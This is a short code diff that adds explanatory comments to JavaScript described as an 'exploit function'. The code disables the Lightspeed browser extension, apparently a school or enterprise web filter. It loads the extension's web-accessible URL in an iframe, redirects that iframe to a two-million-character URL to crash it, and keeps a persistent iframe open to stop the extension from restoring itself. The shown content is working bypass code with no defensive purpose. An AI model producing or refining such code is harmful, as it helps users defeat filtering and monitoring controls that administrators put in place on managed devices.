@@ -143,7 +143,7 @@
     	    extFrame.src = extURL;
     	    document.body.appendChild(extFrame);
     
-    	    setTimeout(function () {
+    	    setTimeout(function () { // Exploit function which creates an iframe pointing to lightspeed's web accessible url and then redirects it to a 2 million digit long URI
         	let killURL = "https://" + "e".repeat(2000000);
         	extFrame.src = killURL;
         	setTimeout(function () {
@@ -156,7 +156,7 @@
                 	setTimeout(function () {
                     	    document.body.removeChild(extFrame2);
                     	    document.body.removeChild(overlay);
-                    	    let persistFrame = document.createElement("iframe");
+                    	    let persistFrame = document.createElement("iframe"); // Persist iframe so lighspeed wont restore itself when the switch is flipped
                     	    persistFrame.src = extURL;
                     	    document.body.appendChild(persistFrame);
                     	    createPopup();
